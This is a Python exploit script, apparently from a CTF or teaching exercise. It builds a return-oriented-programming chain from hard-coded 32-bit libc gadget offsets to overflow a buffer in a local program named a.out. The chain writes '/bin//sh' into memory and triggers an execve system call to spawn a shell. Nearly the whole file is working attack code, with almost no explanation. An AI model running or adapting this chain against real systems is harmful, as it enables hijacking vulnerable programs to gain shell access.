# exploit.py
import sys
import struct
from subprocess import Popen

bufsize = int(sys.argv[1])
libc_base = int(sys.argv[2], 16)
data_addr = int(sys.argv[3], 16)

"""
   f3ad0:       pop    ecx;     pop    eax
   7419a:       mov    DWORD PTR [ecx],eax
   1a9e:       pop    edx
   32eb0:       xor    eax,eax
   2dfb2:       mov    DWORD PTR [edx+0x18],eax
   1930e:       pop    ebx
   83d35:       xor    edx,edx;         mov    eax,edx
   8ac7e:       lea    eax,[edx+0xb]

$ objdump -d /lib/i386-linux-gnu/libc.so.6 | grep "int " | head
   2e285:       cd 80                   int    0x80
"""

buf = 'A' * bufsize
buf += 'AAAA' * 3

# write "/bin//sh" to data_addr
buf += struct.pack('<I', libc_base + 0xf3ad0)    # pop ecx; pop eax
buf += struct.pack('<I', data_addr)
buf += '/bin'
buf += struct.pack('<I', libc_base + 0x7419a)    # mov [ecx], eax

buf += struct.pack('<I', libc_base + 0xf3ad0)    # pop ecx; pop eax
buf += struct.pack('<I', data_addr + 4)
buf += '//sh'
buf += struct.pack('<I', libc_base + 0x7419a)    # mov [ecx], eax

buf += struct.pack('<I', libc_base + 0x1a9e)     # pop edx
buf += struct.pack('<I', data_addr + 8 - 18)
buf += struct.pack('<I', libc_base + 0x32eb0)    # xor eax, eax
buf += struct.pack('<I', libc_base + 0x2dfb2)    # mov [edx+18], eax

# write {"/bin//sh", NULL} to data_addr+12
buf += struct.pack('<I', libc_base + 0xf3ad0)    # pop ecx; pop eax
buf += struct.pack('<I', data_addr + 12)
buf += struct.pack('<I', data_addr)
buf += struct.pack('<I', libc_base + 0x7419a)    # mov [ecx], eax

buf += struct.pack('<I', libc_base + 0x1a9e)     # pop edx
buf += struct.pack('<I', data_addr + 16 - 18)
buf += struct.pack('<I', libc_base + 0x32eb0)    # xor eax, eax
buf += struct.pack('<I', libc_base + 0x2dfb2)    # mov [edx+18], eax

# set ecx = address of {"/bin//sh", NULL}
buf += struct.pack('<I', libc_base + 0xf3ad0)    # pop ecx; pop eax
buf += struct.pack('<I', data_addr + 12)
buf += 'AAAA'

# set ebx = address of "/bin//sh"
buf += struct.pack('<I', libc_base + 0x1930e)    # pop ebx
buf += struct.pack('<I', data_addr)

# set eax=11 and edx=0
buf += struct.pack('<I', libc_base + 0x83d35)    # xor edx, edx; mov eax, edx
buf += struct.pack('<I', libc_base + 0x8ac7e)    # lea eax, [edx+0xb]

# perform system call
buf += struct.pack('<I', libc_base + 0x2e285)    # int 0x80

with open('buf', 'wb') as f:
    f.write(buf)

    p = Popen(['./a.out', buf])
    p.wait()

